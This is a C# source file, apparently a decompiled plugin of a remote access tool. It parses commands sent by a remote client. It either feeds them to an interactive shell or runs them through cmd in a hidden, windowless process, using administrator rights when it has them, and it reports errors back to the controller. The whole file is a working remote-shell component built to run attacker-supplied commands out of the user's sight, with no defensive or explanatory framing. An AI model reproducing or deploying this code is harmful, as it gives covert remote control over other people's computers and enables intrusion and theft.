using System;
using System.Diagnostics;
using System.Security.Principal;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			string text = (string)array[0];
			if (!(text == "Shell"))
			{
				if (text == "ShellRun")
				{
					Shell((string)array[1]);
				}
			}
			else
			{
				HandlerShell.ShellWriteLine((string)array[1]);
			}
		}
		catch (Exception ex)
		{
			Client.Send(LEB128.Write(new object[3] { "Shell", "Error", ex.Message }));
			Client.Error(ex.ToString());
		}
	}

	public static void Shell(string command)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.RedirectStandardOutput = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd";
		processStartInfo.Arguments = "/c " + command;
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			processStartInfo.Verb = "runas";
		}
		processStartInfo.Arguments += " && exit";
		Process process = new Process();
		process.StartInfo = processStartInfo;
		process.Start();
	}
}
